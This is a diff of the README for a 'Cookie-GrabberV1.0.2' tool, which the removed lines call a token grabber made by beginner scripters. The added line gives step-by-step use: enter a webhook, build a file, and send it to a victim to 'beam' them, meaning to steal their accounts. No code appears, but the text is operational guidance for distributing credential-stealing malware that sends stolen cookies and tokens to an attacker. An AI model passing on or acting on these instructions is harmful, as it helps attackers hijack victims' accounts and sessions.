@@ -1,2 +1,1 @@
-# Cookie-GrabberV1.0.2
-hello this is a token grabber me and my friend made in a few weeks we are new to scripting so i want some reviews on it
+download the file and run the "cookie-grabberV1.0.2" file and enter your webhook and enable the options u want then u press build and its gonna build an file in the folder then send the file to to person you want to beam!
